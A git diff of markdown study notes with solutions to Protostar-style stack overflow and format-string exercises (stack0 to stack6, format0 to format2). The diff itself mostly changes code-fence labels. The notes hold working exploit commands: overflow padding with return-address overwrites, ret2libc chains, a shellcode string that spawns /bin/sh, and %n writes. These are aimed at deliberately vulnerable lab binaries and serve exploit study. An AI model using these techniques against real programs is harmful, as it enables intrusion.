@@ -68,7 +68,7 @@ Dump of assembler code for function main:
 
 ### stack0 solution
 
-```sh
+```bash
 python3 -c "print('A' * 80)" | ./stack0
 ```
 
@@ -88,7 +88,7 @@ info registers    # eax 0x45444342
 
 ### stack1 solution
 
-```sh
+```bash
 # ./stack1 $(python3 -c "print(b'A' * 62 + b'\x64\x63\x62\x61')")
 ./stack1 $(python3 -c "print('A' * 64 + '\x64\x63\x62\x61')")
 ```
@@ -101,7 +101,7 @@ b *main+84
 
 ### stack2 solution
 
-```sh
+```bash
 GREENIE=$(python3 -c "print('A' * 64 + '\x0a\x0d\x0a\x0d')");export GREENIE;printenv GREENIE;
   # if use b'', the \x0a will be literally parsed as '\' 'x' '0' 'a'
 ./stack2
@@ -115,7 +115,7 @@ GREENIE=$(python3 -c "print('A' * 64 + '\x0a\x0d\x0a\x0d')");export GREENIE;prin
 
 - find out the target binary
 
-```sh
+```bash
 objdump -d stack3 | grep win
   # @ 0x08 04 84 24 
 ```
@@ -132,7 +132,7 @@ r <<< $(python3 -c "print('A' * 64 + '\x24\x84\x04\x08')")
 
 ### stack3 solution
 
-```sh
+```bash
 ./stack3 <<< $(python3 -c "print('A' * 64)"|xargs echo -en;echo -en '\x24\x84\x04\x08')
 ```
 
@@ -153,7 +153,7 @@ Dump of assembler code for function main:
 End of assembler dump. 
 ```
 
-```sh
+```bash
 objdump -d ./stack4
   # 080483f4
 ```
@@ -166,7 +166,7 @@ r <<< $(python3 -c "print('A' * (64 + int(0xb + 0x4)))"|xargs echo -en;echo -en 
 
 ### stack4 solution
 
-```sh
+```bash
 ./stack4 <<< $(python3 -c "print('A' * (64 + int(0xb + 0x1)))"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
 ./stack4 <<< $(python3 -c "import sys;sys.stdout.buffer.write(b'\x90' * (64 + int(0xb + 0x1)))"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
   # sys.stdout.buffer.write unprintable char test
@@ -213,7 +213,7 @@ r <<< $(python3 -c "print('A' * 76 )"|xargs echo -en;echo -en '\xf4\x83\x04\x08'
 
 ### stack5 solution
 
-```sh
+```bash
 ./stack5 <<< $(python3 -c "print('A' * 76 )"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
 ```
 
@@ -221,7 +221,7 @@ r <<< $(python3 -c "print('A' * 76 )"|xargs echo -en;echo -en '\xf4\x83\x04\x08'
 
 ## stack6: compile time return address check, forbid returning to stack. RoP gadget (Return to .text section)
 
-```sh
+```bash
 ./stack6 <<< $(python3 -c "print('A' * 120 )")
   # SIGSEGV
 objdump -d stack6
@@ -244,7 +244,7 @@ r <<< $(python3 -c "print('A' * 80 )"|xargs echo -en;echo -en '\xe0\x72\xe2\xf7A
 
 - `jmp esp` to the .text `ret`, then `jmp esp` again ho bypass the compiler check.
 
-```sh
+```bash
   # $(python3 -c "import sys;sys.stdout.buffer.write(b'\x90')")
 
   # For the exam, use the clear-text payload.
@@ -264,7 +264,7 @@ payload=$(echo -en '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3
 
 ### stack6 solution
 
-```sh
+```bash
   # Simulate no ASLR.
   # set breakpoint at *ret, the 1st address will be the constant `ret` address.
   # The second time stop at *ret, `set {int} $esp = $esp + 4` `set {int} ($esp+4) = 0xcccccccc`
@@ -302,7 +302,7 @@ payload=$(echo -en '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3
 
 - Overwrite the `<callee>` address, and pretend to be a normal call. Basic structure:
 
-```sh
+```bash
   # payload = padding + libc_func_addr + ret_addr(could be used to chain exec) + func_param0 + func_param1
 r <<< $(python3 -c "print('A' * 80 )"|xargs echo -en;echo -en '\xe0\x72\xe2\xf7AAAA\xaf\xe0\xf1\xf7')
 ```
@@ -342,7 +342,7 @@ x/s 0x7ffff7f745aa
 
 ## misc
 
-```sh
+```bash
 "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
 ```
 
@@ -364,7 +364,7 @@ r $(python3 -c "import sys;sys.stdout.buffer.write(b'A' * 64 + b'\xef\xbe\xad\xd
 
 ### format0 solution
 
-```sh
+```bash
 ./format0 $(python3 -c "import sys;sys.stdout.buffer.write(b'A' * 64 + b'\xef\xbe\xad\xde')")
   # for python2, use sys.stdout.write()
 ./format0 $(python3 -c "import sys;sys.stdout.buffer.write(b'%64s\xef\xbe\xad\xde')")
@@ -382,7 +382,7 @@ p &target
   + overwrite the `varargs` of `printf`, to &target, so that `printf('BBBB%n', &target)`, i.e., the `BBBB` overwrites `<target>`.
   + identify the &target, which should present as an constant value in the stack.
 
-```sh
+```bash
 ./format1 $(echo -en "AAAA";for i in {0..960};do echo -en "%.8x-";done;)
   # 32bit, hence 8 digits of hex, '--' as separator, as ' ' is EOL which terminates reading.
 ```
@@ -393,7 +393,7 @@ p &target
 
 ## format1: solution
 
-```sh
+```bash
 ./format1 $(echo -en "AAAAAACCCCBBBB";for i in {0..127};do echo -en "%.8x-";done;echo -en "%x";)
 ./format1 $(echo -en "AAAAAA\x38\x96\x04\x08BBBB";for i in {0..127};do echo -en "%.8x-";done;echo -en "%n";)
 ```
@@ -402,7 +402,7 @@ p &target
 
 - ref: [%n$, specify the nth arg](https://www.ibm.com/docs/en/i/7.4?topic=functions-printf-print-formatted-characters)
 
-```sh
+```bash
 objdump -t ./format2
   # 080496e4 &target
   # gdb -batch -ex 'file ./format2' -ex 'disassemble vuln'
@@ -439,7 +439,7 @@ objdump -M intel -d ./format2 | awk -F"\n" -v RS="\n\n" '$1 ~ /vuln/'
  80484ba:       c3                      ret
 ```
 
-```sh
+```bash
 ./format2 <<< $(echo -en "AAAA\xe4\x96\x04\x08BBBB";for i in {0..3};do echo -en "%.8x-";done;echo -en "%n")
   # 48 == &target
   # 64 - 48 = 16
@@ -452,6 +452,7 @@ objdump -M intel -d ./format2 | awk -F"\n" -v RS="\n\n" '$1 ~ /vuln/'
 ./format2 <<< $(echo -en "AAAA\xe4\x96\x04\x08BBBB";echo -en '%5$x')
   # now the &target is the 5th argument(in 32-bit hex) on the stack (AAAA is the 4th)
   # %5$: `%n$` a form of conversion specifications. The nth argument on the stack.
+  # careful do not trigger bash substitution "$x"
 ./format2 <<< $(echo -en "AAAA\xe4\x96\x04\x08BBBB";echo -en '%6$16d%5$x')
   # add padding on the printing format of %6$<len><type>
 ./format2 <<< $(echo -en "AAAA\xe4\x96\x04\x08BBBB";echo -en '%6$52x%5$n')
@@ -459,9 +460,10 @@ objdump -M intel -d ./format2 | awk -F"\n" -v RS="\n\n" '$1 ~ /vuln/'
 
 ### format2 solution (ultimate)
 
-```sh
+```bash
 ./format2 <<< $(echo -en "AAAA";for i in {0..3};do echo -en "|%.8x";done;)
 ./format2 <<< $(echo -en "\xe4\x96\x04\x08";echo -en '%5$60x%4$n')
+  # for sh: echo -en $(echo -en "\xe4\x96\x04\x08";echo -en '%5$60x%4$n') | ./format2
 ```
 
 ## format3
